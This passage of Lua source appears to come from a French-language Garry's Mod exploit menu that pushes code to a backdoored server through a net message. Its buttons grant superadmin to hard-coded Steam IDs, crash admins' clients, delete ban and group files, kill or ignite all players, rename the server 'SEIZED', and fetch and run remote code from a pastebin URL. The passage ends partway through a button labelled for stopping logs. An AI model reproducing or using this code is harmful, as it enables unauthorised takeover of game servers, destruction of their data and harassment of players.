Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Superadmin Manon" )
Macro.Paint = function()
surface.SetDrawColor(cyan)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:0:27728622\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "STEAM_0:0:27728622 est superadmin" )
    SploitNotify("L'utilisateur est désormais superadmin")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Superadmin Oxalo" )
Macro.Paint = function()
surface.SetDrawColor(cyan)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:0:102386567\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "STEAM_0:0:102386567 est superadmin" )
    SploitNotify("L'utilisateur est désormais superadmin")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Superadmin Boblepongebgdu49" )
Macro.Paint = function()
surface.SetDrawColor(cyan)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:425619663\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "STEAM_0:1:425619663 est superadmin." )
    SploitNotify("L'utilisateur est désormais superadmin")
    surface.PlaySound("buttons/blip1.wav")
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Superadmin Doralexploratricelaplusbelle" )
Macro.Paint = function()
surface.SetDrawColor(cyan)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:0:425627691\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "STEAM_0:0:425627691 est superadmin." )
    SploitNotify("L'utilisateur est désormais superadmin")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Superadmin Silent" )
Macro.Paint = function()
surface.SetDrawColor(cyan)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:0:99250842\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "STEAM_0:0:99250842 est superadmin." )
    SploitNotify("L'utilisateur est désormais superadmin")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Superadmin Hoper" )
Macro.Paint = function()
surface.SetDrawColor(cyan)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:0:189348722\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "STEAM_0:0:189348722 est superadmin." )
    SploitNotify("L'utilisateur est désormais superadmin")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Superadmin Wazzak" )
Macro.Paint = function()
surface.SetDrawColor(cyan)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), " est superadmin." )
    SploitNotify("L'utilisateur est désormais superadmin")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Superadmin Lolo91160" )
Macro.Paint = function()
surface.SetDrawColor(cyan)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:0:315052913\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "STEAM_0:0:315052913 est superadmin." )
    SploitNotify("L'utilisateur est désormais superadmin")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 360 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Superadmin ANI ELO 67" )
Macro.Paint = function()
surface.SetDrawColor(cyan)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0: 0: 115611801\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "STEAM_0: 0: 115611801 est superadmin." )
    SploitNotify("L'utilisateur est désormais superadmin")
    surface.PlaySound("buttons/blip1.wav") 
end



local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 650, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Crash Les Admins" )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Les admins ont crash :)" )
    SploitNotify("Tout les admins vont crash !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 400, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Pousser tout le monde" )
Macro.Paint = function()
surface.SetDrawColor(mer)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Pousser tout le monde activé" )
    SploitNotify("Tout le monde se pousse !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller) 
Macro:SetPos( 160, 390 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Reset argent" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Argent reset" )
    SploitNotify("Argent reset")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 160, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Inversé la gravité" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Gravité inversé" )
    SploitNotify("Gravité inversé à -600")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 160, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Détruire la physique" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Physic niqué" )
    SploitNotify("Physic changé à -8")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 160, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Hurlement" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Hurlement activé !" )
    SploitNotify("Hurlement activé")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 650, 380 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Reboot sur Gm_Construct" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"map\", \"gm_construct\")")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Map changé à GM_CONSTRUCT" )
    SploitNotify("Map changév à GM_CONSTRUCT")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 160, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Supprimer les grades" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Grades supprimés" )
    SploitNotify("Grades supprimés.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 400, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Bruler tout le monde" )
Macro.Paint = function()
surface.SetDrawColor(mer)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Tout le monde brûle" )
    SploitNotify("Tout le monde brule !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 650, 270 )
Macro:SetText( "Debannir tout le monde (ULX)" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Tout le monde est debanni" )
    SploitNotify("Plus personne n'est banni.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 400, 240 )
Macro:SetText( "Tuer tout le monde" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro.Paint = function()
surface.SetDrawColor(mer)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Tout le monde est mort" )
    SploitNotify("Tout le monde est mort !)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 400, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Grosse têtes" ) 
Macro.Paint = function()
surface.SetDrawColor(mer)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Tout le monde à une grosse tête :)" )
	    SploitNotify("Tout le monde à une grosse tête")
    surface.PlaySound("buttons/blip1.wav") 
        net.Start(netKey)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(100,100,100)) 
        v:ManipulateBoneScale( b, Vector(100,100,100))
        v:ManipulateBoneScale( c, Vector(100,100,100))
        v:ManipulateBoneScale( d, Vector(100,100,100))
        v:ManipulateBoneScale( e, Vector(100,100,100))
        v:ManipulateBoneScale( f, Vector(100,100,100))
        v:ManipulateBoneScale( g, Vector(100,100,100))
        v:ManipulateBoneScale( h, Vector(100,100,100))
        v:ManipulateBoneScale( i, Vector(100,100,100))
        v:ManipulateBoneScale( j, Vector(100,100,100))
        v:ManipulateBoneScale( k, Vector(100,100,100))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 400, 330 )
Macro:SetText( "STOP 2D player" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro.Paint = function()
surface.SetDrawColor(mer)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "2D player désactivé !" )
	    SploitNotify("2D player désactivé !")
    surface.PlaySound("buttons/blip1.wav") 
		net.Start(netKey)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(1,1,1))
        v:ManipulateBoneScale( b, Vector(1,1,1))
        v:ManipulateBoneScale( c, Vector(1,1,1))
        v:ManipulateBoneScale( d, Vector(1,1,1))
        v:ManipulateBoneScale( e, Vector(1,1,1))
        v:ManipulateBoneScale( f, Vector(1,1,1))
        v:ManipulateBoneScale( g, Vector(1,1,1))
        v:ManipulateBoneScale( h, Vector(1,1,1))
        v:ManipulateBoneScale( i, Vector(1,1,1))
        v:ManipulateBoneScale( j, Vector(1,1,1))
        v:ManipulateBoneScale( k, Vector(1,1,1))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 	

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 160, 90 )
Macro:SetText( "M9K Nuke" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Une nuke va exploser quelques part ! :o" )
    SploitNotify("Une nuke va exploser ! (m9k requis)")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[
local rocket = ents.Create("m9k_launched_davycrockett")
local ply2 = table.Random(player.GetAll())
if ply2 == ply then ply:ChatPrint("[RunString] Prevented epicentre from being you.") else
    rocket:SetPos(ply2:GetPos())
    rocket:SetOwner(ply2)
    rocket.Owner = ply2
    rocket:Spawn()
    rocket:Activate()
ply:ChatPrint("[RunString] Allahu akbar.")  
end]])			
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 160, 360 )
Macro:SetText( "Renommé Le Serveur" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Nom du serv. changer à SEIZED" )
    SploitNotify("Nom du serv. changer à SEIZED ")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"rcon\", \"hostname\", \"SEIZED\", \"BY\", \"THE GOD'S\")")		
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 250, 580 )
Macro:SetText( "AllSay - Ce Serveur Est Merdique" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 170, 25 )
Macro.Paint = function()
surface.SetDrawColor(gaymen)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Tout le monde dit 'Ce serveur est putain de merdique :/' " )
    SploitNotify("Tout le monde dit : Ce serveur est putain de merdique :/ !")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("say /ooc Ce serveur est putain de merdique")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 400, 150 )
Macro:SetText( "Force retry all" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro.Paint = function()
surface.SetDrawColor(mer)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Tout le monde se déco/reco ! " )
    SploitNotify("Déco/reco de tous les joueurs")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("retry")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 250, 550 )
Macro:SetText( "AllSay - Nous somme dominés :c" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 170, 25 )
Macro.Paint = function()
surface.SetDrawColor(gaymen)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Tout le monde dit 'Nous sommes dominé :c'" )
    SploitNotify("Tout le monde dit 'Nous sommes dominé :c'")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("say /ooc Nous sommes dominé :c")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 650, 180 )
Macro:SetText( "Luarun en user" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Luarun en user OK." )
    SploitNotify("Luarun set en user !")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"groupallow\", \"user\", \"ulx luarun\")")
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 400, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Force change name" )
Macro.Paint = function()
surface.SetDrawColor(mer)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/GU6WNZdQ\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit (1)
net.SendToServer()
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Tout le monde change de nom :')" )
	    SploitNotify("Tout le monde change de nom :')")
    surface.PlaySound("buttons/blip1.wav") 
        net.WriteBit(1)
        net.SendToServer()
end  


local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 650, 210 )
Macro:SetText( "Stopper Les Logs" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
